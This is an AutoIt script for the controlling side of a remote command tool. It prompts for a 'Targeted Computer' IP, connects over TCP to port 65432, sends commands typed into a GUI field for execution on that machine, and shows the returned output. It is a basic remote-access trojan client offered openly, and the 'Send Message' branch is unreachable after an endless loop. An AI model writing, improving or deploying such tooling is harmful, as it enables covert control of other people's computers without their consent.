#include <GUIConstants.au3>

GUICreate("Form1", 313, 261, 230, 152)
$Command = GUICtrlCreateInput("", 28, 55, 261, 21)
GUICtrlCreateLabel("Enter The Command You Would Like To Execute", 28, 36, 255, 17)
$Send = GUICtrlCreateButton("&Send", 102, 206, 105, 41)
$message = GUICtrlCreateButton("Send Message", 90,96, 125,41)
GUISetState(@SW_SHOW)
$ip =InputBox("IP", "Enter the IP of the Targeted Computer")

TCPStartUp()
$ServerIp= $ip;Enter your remote comp's IP here
$MainSocket=TCPConnect($ServerIp, 65432)
If $MainSocket = -1 Then
    MsgBox(0,"","Could not connect to server")
    Exit
EndIf

msgbox(0,"","connected",1)

While 1
    $nMsg = GUIGetMsg()
    Switch $nMsg
        Case $GUI_EVENT_CLOSE
            Exit
        Case $Send
            SendRequest()
    EndSwitch
    RcvData()
WEnd
If $nMsg = $message Then
	$msg = GUICtrlRead($Command)
	$sReg = MsgBox(0, "Message",$msg)
	EndIf
Func SendRequest()
    $sReq=GUICtrlRead($Command)
    TCPSend($MainSocket,$sReq)
EndFunc

Func RcvData()
    $Data=TCPRecv($MainSocket,2048)
    Sleep(25)
    If $Data<>"" Then
        MsgBox(0,"Command Executed",$Data)
    EndIf
EndFunc
